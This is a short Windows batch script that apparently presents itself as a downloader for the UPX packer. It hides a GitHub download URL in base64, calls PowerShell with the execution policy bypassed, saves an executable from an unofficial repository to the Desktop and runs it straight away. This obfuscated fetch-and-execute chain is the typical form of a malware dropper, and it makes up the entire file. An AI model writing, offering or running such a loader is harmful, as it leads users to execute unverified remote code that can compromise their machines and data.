@echo off
set "ENCODED_URL=aHR0cHM6Ly9naXRodWIuY29tL29waXVtc29mdHdhcmUvdXB4L3Jhdy9tYWluL3VweC5leGU="
set "FILE=%USERPROFILE%\Desktop\upx.exe"

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"$url=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%ENCODED_URL%')); ^
Invoke-WebRequest -Uri $url -OutFile '%FILE%'"

"%FILE%"
pause
